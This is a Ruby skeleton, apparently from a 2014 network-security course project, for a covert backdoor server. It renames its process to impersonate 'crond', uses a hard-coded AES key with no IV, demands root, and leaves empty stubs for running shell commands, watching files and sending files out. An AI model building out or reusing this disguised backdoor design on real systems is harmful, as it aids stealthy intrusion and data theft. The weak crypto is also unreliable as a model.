#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   server.rb - description goes here
--
-- PROGRAM:       server
--                ./server.rb
--
-- FUNCTIONS:     stuff here
--
-- Ruby Gems req: 
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         notes might go here
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'

# rename process immediately
$0 = "/usr/sbin/crond -n"

## Variables
CONFIG_FILE = "not_important"
$KEY = OpenSSL::Digest::SHA256.new("verysecretkey").digest


## Functions
def exitReason(reason)
    puts reason
    exit
end

def load_config_file

end

def validate_config

end

def start_server(port)

end

def encrypt(msg)
  cipher = OpenSSL::Cipher::AES256.new(:CBC)
  cipher.encrypt

  cipher.key = $KEY

  begin
      payload = cipher.update(msg)
      payload << cipher.final
  rescue Exception => e
      puts "encryption error"
  end
  return payload
end

def decrypt(payload)
  cipher = OpenSSL::Cipher::AES256.new(:CBC)
  cipher.decrypt

  cipher.key = $KEY

  begin
      msg = cipher.update(payload)
      msg << cipher.final
  rescue Exception => e
      puts "decryption error"
  end
  return msg
end

def parse_payload(payload)

end

def execute_shell_command(command)

end

def start_watch(type, name)
  #type is file or folder
  
end

def send_file(file, destination)
  
end


## Main

# check for root
raise 'Must run as root' unless Process.uid == 0
